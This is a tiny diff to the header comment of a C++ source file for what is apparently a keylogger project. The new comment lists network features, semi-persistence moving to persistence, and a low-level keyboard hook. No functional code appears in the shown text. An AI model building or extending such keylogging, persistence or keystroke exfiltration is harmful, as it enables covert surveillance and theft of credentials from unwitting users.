@@ -1,5 +1,6 @@
 /**
-        KEYLOGGER
+        KEYLOGGER - Network Features, semi-persistent (upgrading to persistent), Low-Level Keyboard Hook.
+        Supposed to be just a binary of the whole Keylogger spawner project
     @author EP
 **/
 #include<iostream>
